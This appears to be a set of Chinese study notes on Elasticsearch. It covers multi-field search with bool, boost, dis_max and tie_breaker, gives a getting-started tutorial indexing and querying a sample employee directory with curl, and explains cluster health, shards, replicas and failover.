为了理解为什么会出现这样的结果，我们假设用两个分片创建一个索引，以及索引10个文档，6个文档包含词 foo，这样可能会出现分片1中有3个文档包含 foo，分片2中也有三个文档包含 foo。换句话说，我们的文档做了比较好的分布式。
在相关性介绍这一节，我们描述了Elasticsearch默认的相似算法，叫做词频率/反转文档频率（TF/IDF）。词频率是一个词在我们当前查询的文档的字段中出现的次数。出现的次数越多，相关性就越大。反转文档频率指的是该索引中所有文档数与出现这个词的文件数的百分比，词出现的频率越大，IDF越小。
然而，由于性能问题，Elasticsearch不通过索引中所有的文档计算IDF。每个分片会为分片中所有的文档计算一个本地的IDF取而代之。
因为我们的文档做了很好的分布式，每个分片的IDF是相同的。现在假设5个包含foo的文档在分片1中，以及其他6各文档在分片2中。在这个场景下，词foo在第一个分片中是非常普通的（因此重要性较小），但是在另一个分片中是很稀少的（因此重要性较高）。这些区别在IDF中就会产生不正确的结果。
事实证明，这并不是一个问题。你索引越多的文档，本地IDF和全局IDF的区别就会越少。在实际工作的数据量下，本地IDF立刻能够很好的工作（With real-world 
volumes of data, the local IDFs soon even out，不知道这么翻译合不合适）。所以问题不是因为关联失效，而是因为数据太少。
为了测试的目的，对于这个问题，有两种方法可以奏效。第一种方法是创建一个只有一个主分片的索引，像我们介绍match查询那节一样做。如果你只有一个分片，那么本地IDF就是全局IDF。
第二种方法是在你们请求中添加?search_type=dfs_query_then_fetch。dfs就是Distributed Frequency Search，并且它会告诉Elasticsearch检查每一个分片的本地IDF为了计算整个索引的全局IDF。

第十四章 多字段搜索
只有一个简单的match子句的查询是很少的。我们经常需要在一个或者多个字段中查询相同的或者不同的 查询字符串，意味着我们需要能够组合多个查询子句以及使他们的相关性得分有意义。
或许我们在寻找列夫·托尔斯泰写的一本叫《战争与和平》的书。或许我们在Elasticsearch的文档中查找minimum should match，它可能在标题中，或者在一页的正文中。或许我们查找名为John，姓为Smith的人。
在这一章节，我们会介绍用于构建多个查询子句搜索的可能的工具，以及怎么样选择解决方案来应用到你特殊的场景。

14.1 多重查询字段
在明确的字段中的词查询是最容易处理的多字段查询。如果我们知道War and Peace是标题，Leo Tolstoy是作者，可以很容易的用match查询表达每个条件，并且用布尔查询组合起来：
GET /_search
{
  "query": {
    "bool": {
      "should": [
        { "match": { "title":  "War and Peace" }},
        { "match": { "author": "Leo Tolstoy"   }}
      ]
    }
  }
}

布尔查询采用越多匹配越好的方法，所以每个match子句的得分会被加起来变成最后的每个文档的得分。匹配两个子句的文档的得分会比只匹配了一个文档的得分高。
当然，没有限制你只能使用match子句：布尔查询可以包装任何其他的查询类型，包含其他的布尔查询，我们可以添加一个子句来指定我们更喜欢看被哪个特殊的翻译者翻译的那版书：
GET /_search
{
  "query": {
    "bool": {
      "should": [
        { "match": { "title":  "War and Peace" }},
        { "match": { "author": "Leo Tolstoy"   }},
        { "bool":  {
          "should": [
            { "match": { "translator": "Constance Garnett" }},
            { "match": { "translator": "Louise Maude"      }}
          ]
        }}
      ]
    }
  }
}

为什么我们把翻译者的子句放在一个独立的布尔查询中？所有的匹配查询都是should子句，所以为什么不把翻译者的子句放在和title以及作者的同一级？
答案就在如何计算得分中。布尔查询执行每个匹配查询，把他们的得分加在一起，然后乘以匹配子句的数量，并且除以子句的总数。每个同级的子句权重是相同的。在前面的查询中，包含翻译者的布尔查询占用总得分的三分之一。如果我们把翻译者的子句放在和标题与作者同级的目录中，我们会把标题与作者的作用减少的四分之一。
优选子句
在先前的查询中我们可能不需要使每个子句都占用三分之一的权重。我们可能对标题以及作者比翻译者更感兴趣。我们需要调整查询来使得标题和作者的子句相关性更重要。
最简单的方法是使用boost参数。为了提高标题和作者字段的权重，我们给boost参数提供一个比1高的值：
GET /_search
{
  "query": {
    "bool": {
      "should": [
        { "match": { <1>
            "title":  {
              "query": "War and Peace",
              "boost": 2
        }}},
        { "match": { <1>
            "author":  {
              "query": "Leo Tolstoy",
              "boost": 2
        }}},
        { "bool":  { <2>
            "should": [
              { "match": { "translator": "Constance Garnett" }},
              { "match": { "translator": "Louise Maude"      }}
            ]
        }}
      ]
    }
  }
}


标题和作者的boost值为2。
嵌套的布尔查询的boost值为默认的1。 

给boost参数一个最好的值可以通过试验和犯错来很容易的决定：设置一个boost值，执行测试查询，重复上述过程。一个合理的boost值在1-10之间，也可能15。更高的boost值影响会很小，因为分数是标准化得。

14.2 单个查询字符串
布尔查询是多重查询的支柱，它在多数情况下有用，尤其是当你能够将不同查询字符串映射到对应的单一字段时。
问题在于，用户期望把他们所有的搜索项放到一个单独字段中去查询。并且期望这个应用能够得出他们想要的正确的结果。讽刺的是，多字段查询形式是一个高级的——它给用户呈现的形式是高级的，但是执行起来却特别简单。
对于多词，多字段查询，没有一种简单的一个通用的途径。要获得最适合的结果，你必须对你的数据有足够的了解，并且知道如何使用合适的工具。
了解你的数据
当你唯一的用户输入一个单个查询字符串，你可能经常会遇到下面三个情形： 
* Best fields 
    当搜索一个代表概念的词时，例如“brown fox”，这两个词在一起比它们单独更有意义。而像‘title’，‘body’这些字段，会被认为之间存在竞争。文档在同一个字段上会有许多值，所以得分应该来自最匹配的字段。 
* Most fields 
    一个常用的微调相关性的方法就是为同样的数据索引到多个字段，每一个都有自己的解析链
主要的字段可能包含他们的词根，同义词，和去掉音符或者重音符的词。它用来匹配尽可能多的文档。

同一个文本可能会在其他字段建立索引以提供更加精确的匹配。一个字段可能包含非词根的版本，另一个是带着重音符的原词，第三个可能使用小招牌来提供相似词的信息

这些字段作为匹配文档的增加相关性得分标记，匹配的字段越多，越好。

* Cross fields 
    对于一些实体对象，标识的信息可能在多个字段之间分布，每个字段组成是其一部分。如下所示。 
    * Person： ‘first_name’、‘last_name’ 
    * Book：‘title’、‘author’、‘description’ 
    * Address：‘street’、‘city’、‘country’、‘postcode’ 
    在这种情况下，我们想要找到在任何一个所列字段中找到尽可能多的词。我们需要把多个字段当成一个大的字段，然后在这个字段进行搜索，所有这些都是多词的，多字段的查询，但是每种都使用不同的策略

14.3 最好的字段（Best fields）
假如我们有一个网站，允许用户搜索博客信息，例如下面这两个文档：
PUT /my_index/my_type/1
{
    "title": "Quick brown rabbits",
    "body":  "Brown rabbits are commonly seen."
}

PUT /my_index/my_type/2
{
    "title": "Keeping pets healthy",
    "body":  "My quick brown fox eats rabbits on a regular basis."
}

用户输入‘Brown fox’，点击搜索。提前我们不知道用户的搜索选项会被宰‘title’或‘body’字段找到，但是用户很有可能在搜索相关的单词。就人眼观察，显然文档2似乎是更好的匹配，因为两个单词被搜索的单词文档2都包含。
现在运行下面的布尔查询：
GET /my_index/my_type_second/_search
{
    "query": {
        "bool": {
            "should": [
                { "match": { "title": "Brown fox" }},
                { "match": { "body":  "Brown fox" }}
            ]
        }
    }
}

结果如下：
 "hits" : [ {
  "_index" : "my_index_sencond",
  "_type" : "my_type",
  "_id" : "1",
  "_score" : 0.029836398,
  "_source" : {
    "title" : "Quick brown rabbits",
    "body" : "Brown rabbits are commonly seen."
  }
}, {
  "_index" : "my_index_sencond",
  "_type" : "my_type",
  "_id" : "2",
  "_score" : 0.01989093,
  "_source" : {
    "title" : "Keeping pets healthy",
    "body" : "My quick brown fox eats rabbits on a regular basis."
  }
} ]

我们发现，这个查询给出文档1的得分更高。
为了理解这是为什么，考虑布尔查询计算得分的步骤： 
1.它在should子句里运行两个匹配查询 
2.它将两者得分相加 
3.乘以总的匹配子句个数 
4.除以总的子句个数
文档1在两个字段中都包含‘brown’，因此匹配查询成功获得得分。文档2在body字段中包含‘brown’和‘fox’，但title字段却一个单词都不包含。从body得到的高分，加上从title得到的0分，乘以1/2（它会乘以匹配到文档数目/总文档数目），所以得分就低。
　dis_max match查询
现在我们使用dis_max查询或者Disjunction Max Query。Disjunction意思是或（conjunction意思是and）所以Disjunction Max Query查询简单的意思就是：返回任意一个查询匹配成功的文档，并且该文档得分最高：
GET /my_index/my_type_second/_search
{
    "query": {
        "dis_max": {
            "queries": [
                { "match": { "title": "Brown fox" }},
                { "match": { "body":  "Brown fox" }}
            ]
        }
    }
}

这样就返回了我们期望返回的文档了。

14.4 调整Best Field 查询
当用户将搜索内容改成“quick pets”，会发生什么？两个文档中都包含了quick，但是只有文档2中包含了pets。两个文档都没有在同一个字段中全部包含两个搜索词。
一个简单的dis_max查询会挑选出最匹配的字段，并且忽略另外一个：

{
    "query": {
        "dis_max": {
            "queries": [
                { "match": { "title": "Quick pets" }},
                { "match": { "body":  "Quick pets" }}
            ]
        }
    }
}

这个执行结果中，会得出两个相同得分的文档。

我们期望同时出现在title字段和body字段的文档比只在一个字段出现搜索词的文档的得分更高，但是，显示并非如此。你需要记住的是：dis_max查询只是简单地使用单个匹配得分最高的查询而已。
tie_breaker
然而，同时把其他匹配语句的分数考虑在内也是可行的。你可以通过制定tie_breaker参数来实现
    {
        "query": {
            "dis_max": {
                "queries": [
                    { "match": { "title": "Quick pets" }},
                    { "match": { "body":  "Quick pets" }}
                ],
                "tie_breaker": 0.3
            }
        }
    }

tie_breaker参数会使dis_max查询的行为更像dis_max和bool的结合。它会按照下面计算得分：

先获得最匹配的得分
用tie_breaker乘以每个匹配语句的得分
把它们加在一起，然后标准化

通过tie_breaker，所有的匹配语句都会计算，并且最匹配语句得分最高

tie_breaker的值可以设为0-1之间

样例格式 
 









《读书报告 – Elasticsearch入门 》

第一章 Elasticsearch入门
Elasticsearch是一个实时的分布式搜索和分析引擎，使得人们可以在一定规模上和一定速度上实现数据检索，常用于全文本检索，结构化检索、分析以及三种的结合应用。Wikipedia、Guardian、Stack Overflow、Github都在使用Elasticsearch实现自己的相关检索工作。
1.1 you konw,for search
Elasticsearch是一个基于Apache Lucene的开源搜索引擎，全文本检索引擎库。它是一个高性能、可伸缩的信息搜索库，即它不是一个完整的全文检索引擎，而是一个全文检索引擎的架构，提供了完整的查询引擎和索引引擎，部分文本分析引擎（英文和德文）。
1.2 ES安装
理解Elasticsearch最简单的方式就是使用它！安装Elasticsearch之前，首先要先安装java,最好是最新版本。 
然后，在Elasticsearch的官网下载安装包。 
按照完成之后，进入Elasticsearch的bin目录下，启动Elasticsearch。

cd /$path/elasticsearch-2.3.2/bin
./elasticsearch -d //-d代表后台运行

新打开一个terminal，测试Elasticsearch是否正常启动。

curl ‘http://localhost:9200/?pretty’

执行效果如下：
安装Sense
利用Sense可以实现在浏览器里和ES的交互。 
安装、运行Sense：
1.在Kibana目录下，下载安装Sense

./bin/kibana plugin –install elastic/sense

2.启动Kibana

./bin/kibana

3.打开kibana，在浏览器中输入

http://localhost:5601/app/sense

1.3 与Elasticsearch的交互
与Elasticsearch的交互，使用Java语言。
Java API 
Elasticsearch使用两种内置的客户端模式，在其中使用java与之交互：

Node client

node client作为non data node加入到本地集群，换句话说，它本身不存储任何数据，但它清楚地知道数据的存储位置，能够准确地索引到数据存储的节点。

Transport client

轻量级的transport client可以传递请求到远端集群，它本身不加入到集群，但它能给集群中的每个节点发送请求。
Java clients通过9300端口，利用ES的transport协议进行通信，集群中的节点也通过9300端口通信。
1.4 面向文档
应用中的对象很少只是简单的键值列表，更多时候它拥有复杂的数据结构，比如包含日期、地理位置、另一个对象或者数组。 总有一天你会想到把这些对象存储到数据库中。将这些数据保存到由行和列组成的关系数据库中，就好像是把一个丰富，信息表现力强的对象拆散了放入一个非常大的表格中：你不得不拆散对象以适应表模式（通常一列表示一个字段），然后又不得不在查询的时候重建它们。 
Elasticsearch是面向文档(document oriented)的，这意味着它可以存储整个对象或文档(document)。然而它不仅仅是存储，还会索引(index)每个文档的内容使之可以被搜索。在Elasticsearch中，你可以对文档（而非成行成列的数据）进行索引、搜索、排序、过滤。这种理解数据的方式与以往完全不同，这也是Elasticsearch能够执行复杂的全文搜索的原因之一。
1.5 JSON
Javascript对象符号（Javascript Object Notation），文档个序列化格式。
使用json来表示一个用户对象

  {

      "email":      "john@smith.com", 
      "first_name": "John",
      "last_name":  "Smith",
      "info":{
              "bio":      "Eco-warrior and defender of the weak",
              "age":      25,
              "interests":   ["dolphins","whales"]
             },
      "join_date":"2014/05/01"
  }


尽管原始的user对象很复杂，但它的结构和对象的含义已经被完整的体现在JSON中了，在Elasticsearch中将对象转化为JSON并做索引要比在表结构中做相同的事情简单的多。
1.6 索引 index
与传统关系数据库的类比：
Relational DB -> Databases -> Tables -> Rows -> Columns
Elasticsearch -> Indices   -> Types  -> Documents -> Fields

理解点：

索引（名词） 如上文所述，一个索引(index)就像是传统关系数据库中的数据库，它是相关文档存储的地方，index的复数是indices 或indexes。
索引（动词） 「索引一个文档」表示把一个文档存储到索引（名词）里，以便它可以被检索或者查询。这很像SQL中的INSERT关键字，差别是，如果文档已经存在，新的文档将覆盖旧的文档。 
倒排索引 传统数据库为特定列增加一个索引，例如B-Tree索引来加速检索。Elasticsearch和Lucene使用一种叫做倒排索引(inverted index)的数据结构来达到相同目的。

默认情况下，文档中所有的字段都会被索引（拥有一个倒排索引），只有这样他们才是可被搜索的。

Let’s Build an Employee Directory
构建一个Megacorp公司的职工信息，构建employee directory。在分析了需求后，具体需要实现以下要求：
* 为每个员工的文档(document)建立索引，每个文档包含了相应员工的所有信息。
* 每个文档的类型为employee。 
* employee类型归属于索引megacorp。 
* megacorp索引存储在Elasticsearch集群中。

第一步，建索引
    curl -XPUT 'ibd14:9200/megacorp/employee/1' -d'
    {
        "first_name":"John",
        "last_name":"Smith",
        "age":25,
        "about":"I love to go rock climbing",
        "interests":["sports","music"]
    }'
    curl -XPUT 'ibd14:9200/megacorp/employee/2' -d'
    {
        "first_name" :  "Jane",
        "last_name" :   "Smith",
        "age" :         32,
        "about" :       "I like to collect rock albums",
        "interests":  [ "music" ]
    }'
    curl -XPUT 'ibd14:9200/megacorp/employee/3' -d'
    {
        "first_name" :  "Douglas",
        "last_name" :   "Fir",
        "age" :         35,
        "about":        "I like to build cabinets",
        "interests":  [ "forestry" ]
    }'
    curl -XPUT 'ibd14:9200/megacorp/employee/4' -d'
    {
        "first_name":   "Kobe",
        "last_name":    "Bryant",
        "age":          38,
        "about":"I love to play basketball,football",
        "interests":["sports","music"]
    }'
其中$path:/megacorp/employee/1包含三部分信息：
名字      说明
megacorp    索引名
employee    类型名
1       这个员工的ID

1.7 搜索——检索文档
现在Elasticsearch中已经存储了一些数据，我们可以根据业务需求开始工作了。第一个需求是能够检索单个员工的信息。 
只要执行HTTP GET请求并指出文档的“地址”——索引、类型和ID既可。根据这三部分信息，我们就可以返回原始JSON文档：
代码：
curl -XGET 'ibd14:9200/megacorp/employee/1'

（1）简单搜索
GET请求非常简单——轻松获取想要的文档。一个最简单的搜索全部员工的请求：

curl -XGET ‘ibd14:9200/megacorp/employee/_search?pretty’

(2)查询字符串
curl -XGET 'ibd14:9200/megacorp/employee/_search？q=last_name:Smith&pretty'

我们在请求中依旧使用_search关键字，然后将查询语句传递给参数q=。这样就可以得到所有姓氏为Smith的结果。
（3）使用DSL语句查询
查询字符串搜索便于通过命令行完成特定(ad hoc)的搜索，但是它也有局限性。Elasticsearch提供丰富且灵活的查询语言叫做DSL查询(Query DSL),它允许你构建更加复杂、强大的查询。DSL(Domain Specific Language特定领域语言)以JSON请求体的形式出现。我们可以这样表示之前关于“Smith”的查询:
代码：
    curl -XGET 'ibd14:9200/megacorp/employee/_search?pretty' -d'
    {
        "query":{
            "match":{
                "last_name":"Smith"
            }
        }
    }'
这次返回与之前查询相同的结果。你可以看到有些东西改变了，我们不再使用查询字符串(query string)做为参数，而是使用请求体代替。这个请求体使用JSON表示，其中使用了match语句（查询类型之一，具体我们以后会学到）
（4）更复杂的搜索
依旧想要找到姓氏为“Smith”的员工，但是我们只想得到年龄大于30岁的员工。我们的语句将添加过滤器(filter),它使得我们高效率的执行一个结构化搜索：
    curl -XGET 'ibd14:9200/megacorp/employee/_search?pretty' -d'
    {
        "query" : {
            "bool": {
                "must": [
                    {
                        "match" : {
                            "last_name" : "smith"  //<2>
                        }
                    }
                ],
                "filter": {
                    "range" : {
                        "age" : { "gt" : 30 }  //<1>
                    }
                }
            }
        }
    }'
<1> 这部分查询属于区间过滤器(range filter),它用于查找所有年龄大于30岁的数据——gt为”greater than”的缩写。
<2> 这部分查询与之前的match语句(query)一致。
我们添加了一个过滤器(filter)用于执行区间搜索，然后重复利用了之前的match语句。现在我们的搜索结果只显示了一个32岁且名字是“Jane Smith”的员工。
（5）全文搜索
一种更高级的搜索，全文搜索——一种传统数据库很难实现的功能。在这里我们将会搜索所有喜欢“rock climbing”的员工，代码：

curl -XGET 'ibd14:9200/megacorp/employee/_search?pretty' -d'
{
    "query":{
        "match":{
            "about":"rock climbing"
        }
    }
}'


我们使用了之前的match查询，从about字段中搜索”rock climbing”，我们得到了两个匹配文档。
默认情况下，Elasticsearch根据结果相关性评分来对结果集进行排序，所谓的「结果相关性评分」就是文档与查询条件的匹配程度。很显然，排名第一的John Smith的about字段明确的写到“rock climbing”。 
但是为什么Jane Smith也会出现在结果里呢？原因是“rock”在她的about字段中被提及了。因为只有“rock”被提及而“climbing”没有，所以她的score要低于John。
这个例子很好的解释了Elasticsearch如何在各种文本字段中进行全文搜索，并且返回相关性最大的结果集。相关性(relevance)的概念在Elasticsearch中非常重要，而这个概念在传统关系型数据库中是不可想象的，因为传统数据库对记录的查询只有匹配或者不匹配。
（6）短语搜索
目前我们可以在字段中搜索单独的一个词，这挺好的，但是有时候你想要确切的匹配若干个单词或者短语(phrases)。例如我们想要查询同时包含”rock”和”climbing”（并且是相邻的）的员工记录。
要做到这个，我们只要将match查询变更为match_phrase查询即可:

curl -XGET 'ibd14:9200/megacorp/employee/_search?pretty' -d'
{
    "query":{
        "match_phrase":{
            "about":"rock climbing"
        }
    }
}'


（7）高亮我们的搜索
很多应用喜欢从每个搜索结果中高亮(highlight)匹配到的关键字，这样用户可以知道为什么这些文档和查询相匹配。在Elasticsearch中高亮片段是非常容易的。让我们在之前的语句上增加highlight参数。

curl -XGET 'ibd14:9200/megacorp/employee/_search?pretty' -d'
{
    "query" : {
        "match_phrase" : {
                "about" : "rock climbing"
            }
    },  
    "highlight": {
            "fields" : {
                "about" : {} 
            }
        } 
}'


当我们运行这个语句时，会命中与之前相同的结果，但是在返回结果中会有一个新的部分叫做highlight，这里包含了来自about字段中的文本，并且用来标识匹配到的单词。
1.8 聚合——分析
最后，我们还有一个需求需要完成：允许管理者在职员目录中进行一些分析。 Elasticsearch有一个功能叫做聚合(aggregations)，它允许你在数据上生成复杂的分析统计。它很像SQL中的GROUP BY但是功能更强大。
（1）example 1.8-1
举个例子，让我们找到所有职员中最大的共同点（兴趣爱好）是什么：

curl -XGET 'ibd14:9200/megacorp/employee/_search?pretty' -d'
{
    "aggs":{
        "all_interests":{
                    "terms" :{
                        "field":"interests"
                    }
        }
    }
}'

从查询结果中，我们可以看到两个职员对音乐有兴趣，一个喜欢林学，一个喜欢运动。这些数据并没有被预先计算好，它们是实时的从匹配查询语句的文档中动态计算生成的。

（2）example1.8-2
如果我们想知道所有姓”Smith”的人最大的共同点（兴趣爱好），我们只需要增加合适的语句既可。

curl -XGET 'ibd14:9200/megacorp/employee/_search?pretty' -d'
{
    "query":{
        "match":{
            "last_name":"smith"
        }
    },
    "aggs":{
        "all_interests":{
                    "terms" :{
                        "field":"interests"
                    }
        }
    }
}'


从执行结果看all_interests聚合已经变成只包含和查询语句相匹配的文档了。
（3）example 1.8-3
聚合也允许分级汇总。例如，让我们统计每种兴趣下职员的平均年龄：
curl -XGET 'ibd14:9200/megacorp/employee/_search?pretty' -d'
{
    "aggs":{
        "all_interests":{
                "terms" :{
                    "field":"interests"
                },
                "aggs":{
                    "avg_age":{
                        "avg":{
                            "field":"age"
                       }
                    }
                }
        }
    }
}'

该聚合结果比之前的聚合结果要更加丰富。我们依然得到了兴趣以及数量（指具有该兴趣的员工人数）的列表，但是现在每个兴趣额外拥有avg_age字段来显示具有该兴趣员工的平均年龄。
即使还不理解语法，但也可以大概感觉到通过这个特性可以完成相当复杂的聚合工作，可以处理任何类型的数据。
1.9 小结
这个简短的教程能够很好的描述Elasticsearch的功能。当然这只是一些皮毛，为了保持简短，还有很多的特性未提及——像推荐、定位、渗透、模糊以及部分匹配等。但这也突出了构建高级搜索功能是多么的容易。无需配置，只需要添加数据然后开始搜索！
可能有些语法有些困惑，或者在微调方面有些疑问。那么，本书的其余部分将深入这些问题的细节，让你全面了解Elasticsearch的工作过程。
1.10 分布式
在章节的开始我们提到Elasticsearch可以扩展到上百（甚至上千）的服务器来处理PB级的数据。然而我们的教程只是给出了一些使用Elasticsearch的例子，并未涉及相关机制。Elasticsearch为分布式而生，而且它的设计隐藏了分布式本身的复杂性。
Elasticsearch在分布式概念上做了很大程度上的透明化，在教程中你不需要知道任何关于分布式系统、分片、集群发现或者其他大量的分布式概念。所有的教程你即可以运行在你的笔记本上，也可以运行在拥有100个节点的集群上，其工作方式是一样的。
1  Elasticsearch致力于隐藏分布式系统的复杂性。以下这些操作都是在底层自动完成的： 将你的文档分区到不同的容器或者分片(shards)中，它们可以存在于一个或多个节点中。 将分片均匀的分配到各个节点，对索引和搜索做负载均衡。 冗余每一个分片，防止硬件故障造成的数据丢失。 将集群中任意一个节点上的请求路由到相应数据所在的节点。
无论是增加节点，还是移除节点，分片都可以做到无缝的扩展和迁移。 当你阅读本书时，你可以遇到关于Elasticsearch分布式特性的补充章节。这些章节将教给你如何扩展集群和故障转移，如何处理文档存储，如何执行分布式搜索，分片是什么以及如何工作。 这些章节不是必读的——不懂这些内部机制也可以使用Elasticsearch的。但是这些能够帮助你更深入和完整的了解Elasticsearch。你可以略读它们，然后在你需要更深入的理解时再回头翻阅。
1.11 结语
现在对Elasticsearch可以做些什么以及其易用程度有了大概的了解。Elasticsearch致力于降低学习成本和轻松配置。学习Elasticsearch最好的方式就是开始使用它：开始索引和检索吧！ 当然，你越是了解Elasticsearch，你的生产力就越高。你越是详细告诉Elasticsearch你的应用的数据特点，你就越能得到准确的输出。
本书其余部分将帮助你从新手晋级到专家。每一个章节都会阐述一个要点，并且会包含专家级别的技巧。如果你只是刚起步，那么这些技巧可能暂时和你无关。Elasticsearch有合理的默认配置而且可以在没有用户干预的情况下做正确的事情。当需要提升性能时你可以随时回顾这些章节。

第二章 集群内部工作方式
这部分是关于Elasticsearch在分布式环境下，工作机制的补充章节。这个章解释了一些通用的术语，例如集群(cluster)、节点(node)和分片(shard)，Elasticsearch的扩展机制，以及它如何处理硬件故障。
Elasticsearch用于构建高可用和可扩展的系统。扩展的方式包括两种： 
（1）纵向扩展——购买更好的服务器
（2）横向扩展——购买更多的服务器
Elasticsearch虽然能从更强大的硬件中获得更好的性能，但是纵向扩展有它的局限性。真正的扩展应该是横向的，通过增加节点来均摊负载和增加可靠性。 
由于Elasticsearch天生就是分布式的：它知道如何管理节点来提供高扩展和高可用。因此底层实现并不用去关心。
2.1 空集群
当启动一个单独的节点，它还没有数据和索引，这个集群就只有一个节点，同时也充当MASTER的角色。
一个节点(node)就是一个Elasticsearch实例，而一个集群(cluster)由一个或多个节点组成，它们具有相同的cluster.name，它们协同工作，分享数据和负载。当加入新的节点或者删除一个节点时，集群就会感知到并平衡数据。
集群中一个节点会被选举为主节点(master),它将临时管理集群级别的一些变更，例如新建或删除索引、增加或移除节点等。主节点不参与文档级别的变更或搜索，这意味着在流量增长的时候，该主节点不会成为集群的瓶颈。任何节点都可以成为主节点。我们例子中的集群只有一个节点，所以它会充当主节点的角色。
用户能够与集群中的任何节点通信，包括主节点。每一个节点都知道文档存在于哪个节点上，它们可以转发请求到相应的节点上。我们访问的节点负责收集各节点返回的数据，最后一起返回给客户端。这一切都由Elasticsearch处理。
#
2.2 集群健康
在Elasticsearch集群中可以监控统计很多信息，但是只有一个是最重要的：集群健康(cluster health)。集群健康有三种状态: 
green,yellow或red。
通过命令可以查看集群的状态：

curl -XGET ‘ibd14:9200/_cluster/health?pretty’

从返回的信息中，status字段提供一个综合的指标来表示集群的的服务状况。三种颜色各自的含义：
| green ——    所有主要分片和复制分片都可用  
| yellow —— 所有主要分片可用，但不是所有复制分片都可用    
| red    —— 不是所有的主要分片都可用
2.3 添加索引
索引(index)——一个存储关联数据的地方。实际上，索引只是一个用来指向一个或多个分片(shards)的“逻辑命名空间(logical namespace)”。
分片是最小级别的工作单元，它只索引中所有数据的一部分。在接下来的《深入分片》一章，将详细说明分片的工作原理，但是现在我们只要知道分片就是一个Lucene实例，并且它本身就是一个完整的搜索引擎。我们的文档存储在分片中，并且在分片中被索引，但是我们的应用程序不会直接与它们通信，取而代之的是，直接与索引通信。
分片是Elasticsearch在集群中分发数据的关键。可以把分片想象成数据的容器。文档存储在分片中，然后分片分配到你集群中的节点上。当你的集群扩容或缩小，Elasticsearch将会自动在你的节点间迁移分片，以使集群保持平衡。
分片可以是主分片(primary shard)或者是复制分片(replica shard)。你索引中的每个文档属于一个单独的主分片，所以主分片的数量决定了索引最多能存储多少数据。
理论上主分片能存储的数据大小是没有限制的，限制取决于你实际的使用情况。分片的最大容量完全取决于你的使用状况：硬件存储的大小、文档的大小和复杂度、如何索引和查询你的文档，以及你期望的响应时间。
复制分片只是主分片的一个副本，它可以防止硬件故障导致的数据丢失，同时可以提供读请求，比如搜索或者从别的shard取回文档。
当索引创建完成的时候，主分片的数量就固定了，但是复制分片的数量可以随时调整。
现在在集群中唯一一个空节点上创建一个叫做blogs的索引。默认情况下，一个索引被分配5个主分片，但是为了演示的目的，我们只分配3个主分片和一个复制分片（每个主分片都有一个复制分片）：
curl -XPUT 'ibd14:9200/blogs' -d'
{
    "settings":{
        "number_of_shards": 3,
        "number_of_replicas":1
    }   
}'

通过前面的设置三个主分片都被分配到唯一的节点Node 1上。如果我们现在检查集群健康(cluster-health)，我们将见到以下信息：
{
    "cluster_name": "elasticsearch",
    "status": "yellow", <1>
    "timed_out": false,
    "number_of_nodes": 1,
    "number_of_data_nodes": 1,
    "active_primary_shards": 3,
    "active_shards": 3,
    "relocating_shards": 0,
    "initializing_shards": 0,
    "unassigned_shards": 3, <2>
    "delayed_unassigned_shards": 0,
    "number_of_pending_tasks": 0,
    "number_of_in_flight_fetch": 0,
    "task_max_waiting_in_queue_millis": 0,
    "active_shards_percent_as_number": 50
}

其中status是yellow，是因为三个复制分片还没有被分配到节点上。
集群的健康状态yellow表示所有的主分片(primary shards)启动并且正常运行了——集群已经可以正常处理任何请求——但是复制分片(replica shards)还没有全部可用。事实上所有的三个复制分片现在都是unassigned状态——它们还未被分配给节点。在同一个节点上保存相同的数据副本是没有必要的，如果这个节点故障了，那所有的数据副本也会丢失。
2.4 增加故障转移
上一节提到了由于复制分片还没有分配到节点上，所以一旦唯一的节点Node 1挂点，数据就会丢失，有单点故障的风险。要防止单点故障，我们唯一需要做的就是启动另一个节点。

 启动第二个节点
为了测试在增加第二个节点后发生了什么，你可以使用与第一个节点相同的方式启动第二个节点（《运行Elasticsearch》一章），而且命令行在同一个目录——一个节点可以启动多个Elasticsearch实例。
只要第二个节点与第一个节点有相同的cluster.name（请看./config/elasticsearch.yml文件），它就能自动发现并加入第一个节点所在的集群。如果没有，检查日志找出哪里出了问题。这可能是网络广播被禁用，或者防火墙阻止了节点通信。

当第二个节点Node 2已经加入集群，三个复制分片(replica shards)——分别对应三个主分片，也已经被分配了，这意味着在丢失任意一个节点的情况下依旧可以保证数据的完整性。
文档的索引将首先被存储在主分片中，然后并发复制到对应的复制节点上。这可以确保我们的数据在主节点和复制节点上都可以被检索。
现在查看集群的健康状况，status就变成了green。这意味着三个主分片和三个复制分片都已可用，此时集群不但功能完备，而且具有高可用性。
2.5 横向扩展
启动第三个节点，我们的集群会重新组织自己，包含3个节点的集群——分片已经被重新分配以平衡负载。
Node3包含了分别来自Node 1和Node 2的一个分片，这样每个节点就有两个分片，和之前相比少了一个，这意味着每个节点上的分片将获得更多的硬件资源（CPU、RAM、I/O）。
分片本身就是一个完整的搜索引擎，它可以使用单一节点的所有资源。我们拥有6个分片（3个主分片和三个复制分片），最多可以扩展到6个节点，每个节点上有一个分片，每个分片可以100%使用这个节点的资源。
2.6 继续扩展
如果我们要扩展到6个以上的节点，要怎么做？
主分片的数量在创建索引时已经确定。实际上，这个数量定义了能存储到索引里数据的最大数量（实际的数量取决于你的数据、硬件和应用场景）。然而，主分片或者复制分片都可以处理读请求——搜索或文档检索，所以数据的冗余越多，我们能处理的搜索吞吐量就越大。
复制分片的数量可以在运行中的集群中动态地变更，这允许我们可以根据需求扩大或者缩小规模。让我们把复制分片的数量从原来的1增加到2：
curl -XPUT 'ibd14:9200/blogs' -d'
{
    "settings":{
        "number_of_replicas":2
    }   
}'

这样blogs索引现在就有了9个分片：3个主分片和6个复制分片。这意味着我们能够扩展到9个节点，再次变成每个节点一个分片。这样使我们的搜索性能相比原始的三节点集群增加三倍。
在同样数量的节点上增加更多的复制分片并不能提高性能，因为这样做的话平均每个分片的所占有的硬件资源就减少了。
不过这些额外的复制节点使我们有更多的冗余：通过以上对节点的设置，我们能够承受两个节点故障而不丢失数据。
2.7 应对故障
前面已经提到过Elasticsearch可以应对节点失效，所以当我们杀掉第一个节点的进程（以下简称杀掉节点），集群会发生什么变化呢！
例如，杀掉Node 1的进程后，由于一个集群必须要有一个主节点才能使其功能正常，所以集群做的第一件事就是各节点选举了一个新的主节点：Node 2。
主分片1和2在我们杀掉Node 1时已经丢失，我们的索引在丢失主分片时不能正常工作。如果此时我们检查集群健康，我们将看到状态red：不是所有主节点都可用！
但是丢失的两个主分片的完整拷贝存在于其他节点上，所以新主节点做的第一件事是把这些在Node 2和Node 3上的复制分片升级为主分片，这时集群健康回到yellow状态。这个提升是瞬间完成的，就好像按了一下开关。
此时集群健康状态是yellow而不是green？我们有三个主分片，但是我们指定了每个主分片对应两个复制分片，当前却只有一个复制分片被分配，这就是集群状态无法达到green的原因。
